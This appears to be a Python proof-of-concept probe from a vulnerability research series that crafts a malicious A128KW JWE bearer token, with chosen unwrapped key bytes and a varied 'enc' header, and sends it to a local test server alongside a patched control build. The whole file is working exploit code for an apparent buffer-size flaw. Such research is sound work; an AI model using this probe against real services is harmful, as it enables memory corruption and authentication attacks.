#!/usr/bin/env python3
"""W219: one crafted A128KW bearer JWE with a chosen `enc` to 127.0.0.1:18444.

The W212/W215/W217/W218 bearer probes all used enc=A128CBC-HS256 (32-byte
CEK). This probe varies only the attacker-controlled `enc` header, which
pins a 16/24/32/48/64-byte CEK in _keylen_from_enc(), and keeps the same
152-byte raw encrypted_key / 144-byte chosen write. The fixed build gets
the same bytes on 127.0.0.1:18445 as a control.
"""
import json
import os
import socket
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from probe import b64u, wrap

HOST = "127.0.0.1"
PORT = int(os.environ.get("W2_PORT", "18444"))
EVIDENCE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence")
TAG = os.environ.get("W2_TAG", "w219")
ENC = os.environ.get("W2_ENC", "A128CBC-HS256")
KEK = bytes.fromhex(os.environ.get("W2_KEK", "30313233343536373839616263646566"))

# 144 chosen bytes: a readable label in the first 16, then an unmistakable
# qword pattern over the whole forward region probed by W215/W217/W218.
plain = bytearray(144)
plain[0:16] = b"MISHE-W219-ENC-!"
for off in range(16, 144, 8):
    plain[off:off + 8] = b"AAAAAAAA"

header = {"alg": "A128KW", "enc": ENC}
h = b64u(json.dumps(header, separators=(",", ":")).encode())
ek = wrap(bytes(plain), KEK)
tok = ".".join((h, b64u(ek), b64u(os.urandom(16)),
                b64u(b"\x11" * 48), b64u(b"\x22" * 32)))

req = (
    b"GET /private HTTP/1.1\r\n"
    b"Host: 127.0.0.1:" + str(PORT).encode() + b"\r\n"
    b"User-Agent: w2-w219-probe\r\n"
    b"Authorization: Bearer " + tok.encode("ascii") + b"\r\n"
    b"Connection: close\r\n\r\n"
)
os.makedirs(EVIDENCE, exist_ok=True)
with open(os.path.join(EVIDENCE, "%s-request.bin" % TAG), "wb") as f:
    f.write(req)
with open(os.path.join(EVIDENCE, "%s-token.txt" % TAG), "w") as f:
    f.write(tok + "\n")
with socket.create_connection((HOST, PORT), timeout=10) as s:
    s.sendall(req)
    chunks = []
    while True:
        data = s.recv(4096)
        if not data:
            break
        chunks.append(data)
resp = b"".join(chunks)
with open(os.path.join(EVIDENCE, "%s-response.bin" % TAG), "wb") as f:
    f.write(resp)
print("W219_ENC=%s EK_RAW_LEN=%d RESPONSE=%r" % (ENC, len(ek), resp[:120]))
